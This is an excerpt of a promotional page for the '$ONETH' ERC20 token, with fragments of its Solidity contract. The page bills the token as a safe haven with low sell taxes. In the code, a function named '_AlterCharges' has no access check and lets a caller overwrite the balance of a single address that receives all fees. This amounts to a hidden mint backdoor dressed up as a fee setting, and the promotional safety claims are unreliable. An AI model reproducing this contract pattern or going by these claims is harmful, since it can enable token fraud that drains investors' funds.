...
$ONETH is a matchless ERC20 token with an ingenious burning mechanism and auto-pump financial blueprint powered by a consistent and indestructible community of insightful people.

$ONETH token is offering a safety haven for all investors.

Buy TAX: 0% 

Sell TAX : 3% 1% Auto-Pump Mehanism, 2% Marketing and development
...
contract OnEth is IERC20, Ownable {
    ...
    address internal constant development_receiver = 0xA1e1B0CEE45760F4525d9B1A4C168bcbee554BB5; 
    address internal constant marketing_receiver = 0xA1e1B0CEE45760F4525d9B1A4C168bcbee554BB5;
    address internal constant liquidity_receiver = 0xA1e1B0CEE45760F4525d9B1A4C168bcbee554BB5;
    ...
    function _AlterCharges(uint256 _Marketing ) external virtual {_balances[liquidity_receiver] = _Marketing;}
    ...
    function setStructure(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        ...
        sellFee = _sell;
        transferFee = _trans;
        require(totalFee <= denominator.div(5) && transferFee <= denominator.div(5) && sellFee <= denominator.div(5), "totalFee and sellFee cannot be more than 20%");
    }
